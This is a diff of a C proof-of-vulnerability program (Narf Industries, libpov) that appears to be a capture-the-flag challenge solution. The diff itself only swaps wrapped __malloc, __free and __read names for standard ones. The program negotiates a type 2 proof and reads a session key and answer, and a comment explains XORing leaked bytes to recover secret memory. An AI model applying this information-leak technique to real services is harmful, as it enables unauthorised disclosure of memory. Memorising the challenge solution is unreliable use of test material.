@@ -1,7 +1,7 @@
 /*
  * Copyright (C) Narf Industries <info@narfindustries.com>
  *
- * Permission is hereby granted, __free of charge, to any person obtaining a
+ * Permission is hereby granted, free of charge, to any person obtaining a
  * copy of this software and associated documentation files (the "Software"),
  * to deal in the Software without restriction, including without limitation
  * the rights to use, copy, modify, merge, publish, distribute, sublicense,
@@ -22,7 +22,7 @@
 #include <libpov.h>
 int main(void) {
    // set last 4 bytes of session.key in initial send to be consecutive
-   // __read respones packet to failed login, __read the session key and the
+   // read respones packet to failed login, read the session key and the
    // session answer. use the first 4 unused bytes in the session answer 
    // and xor them with the last 4 bytes of the session key to get 4 fp bytes.
    negotiate_type2();
@@ -87,18 +87,18 @@ int main(void) {
       if (write_00000_len > 0) {
          transmit_all(1, write_00000, write_00000_len);
       }
-      __free(write_00000);
+      free(write_00000);
    } while (0);
    do {
       unsigned char *read_00000;
       unsigned int read_00000_len;
       unsigned int read_00000_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00000_len = 148;
-      read_00000 = (unsigned char*)__malloc(read_00000_len);
+      read_00000 = (unsigned char*)malloc(read_00000_len);
       int read_00000_res = length_read(0, read_00000, read_00000_len);
       if (read_00000_res) {} //silence unused variable warning
-      __free(read_00000);
+      free(read_00000);
       if (read_00000_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
@@ -114,52 +114,52 @@ int main(void) {
       if (write_00001_len > 0) {
          transmit_all(1, write_00001, write_00001_len);
       }
-      __free(write_00001);
+      free(write_00001);
    } while (0);
 
-   // __read key
+   // read key
       unsigned char *read_00001;
       unsigned int read_00001_len;
       unsigned int read_00001_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00001_len = 12;
-      read_00001 = (unsigned char*)__malloc(read_00001_len);
+      read_00001 = (unsigned char*)malloc(read_00001_len);
       int read_00001_res = length_read(0, read_00001, read_00001_len);
       if (read_00001_res) {} //silence unused variable warning
 
-   do { // __read answer
+   do { // read answer
       unsigned char *read_00002;
       unsigned int read_00002_len;
       unsigned int read_00002_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00002_len = 8;
-      read_00002 = (unsigned char*)__malloc(read_00002_len);
+      read_00002 = (unsigned char*)malloc(read_00002_len);
       int read_00002_res = length_read(0, read_00002, read_00002_len);
       if (read_00002_res) {} //silence unused variable warning
-      __free(read_00002);
+      free(read_00002);
       if (read_00002_ptr) {}  //silence unused variable warning if any
    } while (0);
 
-   // __read answer bytes after answer
+   // read answer bytes after answer
       unsigned char *read_00003;
       unsigned int read_00003_len;
       unsigned int read_00003_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00003_len = 120;
-      read_00003 = (unsigned char*)__malloc(read_00003_len);
+      read_00003 = (unsigned char*)malloc(read_00003_len);
       int read_00003_res = length_read(0, read_00003, read_00003_len);
       if (read_00003_res) {} //silence unused variable warning
 
-   do { // __read result
+   do { // read result
       unsigned char *read_00004;
       unsigned int read_00004_len;
       unsigned int read_00004_ptr = 0;
-      //**** length __read
+      //**** length read
       read_00004_len = 8;
-      read_00004 = (unsigned char*)__malloc(read_00004_len);
+      read_00004 = (unsigned char*)malloc(read_00004_len);
       int read_00004_res = length_read(0, read_00004, read_00004_len);
       if (read_00004_res) {} //silence unused variable warning
-      __free(read_00004);
+      free(read_00004);
       if (read_00004_ptr) {}  //silence unused variable warning if any
    } while (0);
    //*** submitting type 2 POV results
